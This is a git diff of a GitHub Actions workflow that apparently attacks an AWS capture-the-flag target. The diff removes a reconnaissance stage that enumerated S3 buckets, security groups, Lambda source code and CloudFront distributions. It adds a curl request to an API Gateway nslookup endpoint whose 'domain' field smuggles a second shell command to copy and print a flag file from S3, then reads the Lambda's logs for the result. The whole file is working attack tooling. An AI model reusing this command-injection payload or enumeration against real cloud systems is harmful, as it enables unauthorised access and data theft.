@@ -20,63 +20,32 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      # ===== Everything below is confirmed allowed by Statement2 =====
-      # (no aws:SourceVpc condition - works from the GitHub runner)
-
-      - name: List S3 buckets and their policies/contents
+      - name: Trigger nslookup via API Gateway
         run: |
-          echo "===== S3 BUCKETS ====="
-          aws s3 ls
-          echo "===== BUCKET DETAILS ====="
-          for BUCKET in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
-            echo "### $BUCKET"
-            aws s3api get-bucket-policy --bucket "$BUCKET" --query Policy --output text 2>&1
-            aws s3 ls "s3://$BUCKET" --recursive
-          done
+          echo "===== TRIGGERING LAMBDA VIA API GATEWAY ====="
+          curl -s -i -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain":"example.com; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}'
 
-      - name: Describe VPCs and security groups
+      - name: Wait for logs to propagate
+        run: sleep 8
+
+      - name: List recent log streams
         run: |
-          echo "===== VPCs ====="
-          aws ec2 describe-vpcs
-          echo "===== SECURITY GROUPS ====="
-          aws ec2 describe-security-groups
+          echo "===== LOG STREAMS ====="
+          aws logs describe-log-streams \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --order-by LastEventTime --descending --limit 5
 
-      - name: Lambda - list functions and get details
+      - name: Get log events from most recent stream
         run: |
-          echo "===== LAMBDA FUNCTIONS ====="
-          aws lambda list-functions
-          echo "===== LAMBDA CODE LOCATION ====="
-          URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
-          echo "$URL"
-          curl -sL "$URL" -o code.zip
-
-      - name: Unzip and show handler source
-        run: |
-          mkdir -p extracted
-          unzip -o code.zip -d extracted
-          echo "===== FILES ====="
-          find extracted -type f
-          echo "===== lambda_function.py ====="
-          cat extracted/lambda_function.py || true
-
-      - name: Lambda - resource-based (invoke) policy
-        run: |
-          echo "===== LAMBDA RESOURCE POLICY ====="
-          aws lambda get-policy --function-name nslookupv2
-
-      - name: CloudFront distributions
-        run: |
-          echo "===== CLOUDFRONT DISTRIBUTIONS ====="
-          aws cloudfront list-distributions --query 'DistributionList.Items[].{Id:Id,Domain:DomainName,Origin:Origins.Items[0].DomainName}' --output table
-          echo "===== SITE DISTRIBUTION DETAIL ====="
-          aws cloudfront get-distribution --id EKD9KH16RB5G3
-
-      - name: Upload artifacts
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: recon-output
-          path: |
-            code.zip
-            extracted/
-          if-no-files-found: ignore
+          echo "===== LOG EVENTS ====="
+          STREAM=$(aws logs describe-log-streams \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --order-by LastEventTime --descending --limit 1 \
+            --query 'logStreams[0].logStreamName' --output text)
+          echo "Stream: $STREAM"
+          aws logs get-log-events \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --log-stream-name "$STREAM" \
+            --query 'events[*].message' --output text
